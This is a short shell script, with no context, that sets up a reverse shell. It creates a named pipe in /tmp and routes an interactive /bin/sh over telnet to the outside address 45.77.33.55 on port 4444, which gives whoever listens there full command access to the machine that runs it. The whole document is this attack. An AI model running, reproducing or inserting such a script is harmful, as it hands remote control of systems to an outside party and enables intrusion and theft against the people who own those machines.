#!/bin/sh
mkfifo /tmp/session-pipe
cat /tmp/session-pipe | /bin/sh -i 2>&1 | telnet 45.77.33.55 4444 > /tmp/session-pipe
